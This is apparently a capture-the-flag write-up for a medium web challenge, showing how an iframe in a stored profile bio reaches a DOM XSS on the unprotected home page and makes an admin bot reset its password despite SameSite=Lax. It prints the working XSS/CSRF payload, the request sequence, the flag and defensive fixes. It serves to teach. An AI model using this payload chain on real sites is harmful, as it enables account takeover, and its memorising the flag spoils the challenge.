# 07 · samesite-csrf (medium)

The Meridian portal needs a session to see anything. After signing up you get a
home page, a "Report a user profile" form that the admin opens in a browser, and a
profile bio shown on your public page `/profile/<you>`. Two things stand out:
- `POST /password-reset` changes the current user's password with **no old
  password and no CSRF token**.
- The session cookie is `HttpOnly; SameSite=Lax`.

The goal: make the admin's browser reset the admin password to something you know,
then log in and read `GET /admin`.

## Vulnerability
**SameSite blocks cross-site CSRF, not same-site script.** A page that auto-submits
`POST /password-reset` cross-site fails — `SameSite=Lax` withholds the cookie, so
the server sees no session. But SameSite says nothing about script running on the
challenge's own origin: a same-origin `fetch('/password-reset')` sends the cookie
automatically. So you need XSS on this site. (`HttpOnly` stops you *stealing* the
cookie, but you *ride* it in place.)

There are two XSS sinks, and a CSP forces you to chain them:
- `/profile/<user>` renders the bio as raw HTML (stored injection) but is served
  with `Content-Security-Policy: default-src 'self'`, so inline handlers don't run.
- `/` runs `notice.innerHTML = decodeURIComponent(location.hash.slice(1))` — a DOM
  XSS with **no CSP** — but the report form only accepts `/profile/<user>` links,
  so you can't send the admin a `/#payload` link directly.

CSP is per-document, so a stored injection on the profile that frames `/` escapes
into the unprotected same-origin home page.

## Exploitation
Set your bio to an iframe that loads the home page with the reset payload in the
fragment:
```html
<iframe src="/#<img src=x onerror=fetch('/password-reset',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'password=pwned'})>"></iframe>
```
Report your own profile:
```
POST /report   url=http://HOST:8007/profile/<you>
```
In the admin bot: `/profile/<you>` (CSP blocks inline JS) loads the iframe → `/`
(no CSP, admin session) runs `innerHTML` → `<img onerror>` fires →
`fetch('/password-reset')` sends the admin cookie same-site → admin password
becomes `pwned`. Then:
```
POST /login   username=admin&password=pwned
GET  /admin
```
`solve/solve.py <base_url>` automates the chain.

Note: you can't just exfiltrate the flag once the sink runs — the bot container
has no outbound network (all egress, including DNS, is dropped), so the password
you set and log in with is the only thing that crosses the air-gap.

## Flag
```
SecurinetsENIT{s4m3s1t3_stops_cr0ss_s1t3_n0t_y0ur_0wn_d0m_xss}
```

## Fix
- CSRF-protect state-changing requests regardless of SameSite: a per-request token,
  and require the current password on change.
- Fix the XSS: contextually encode user content; replace `innerHTML` with
  `textContent`.
- Apply CSP consistently — a strong CSP on one page is undone by a CSP-free sink on
  another same-origin page.
- Invalidate sessions on password change, and keep the review bot egress-denied.
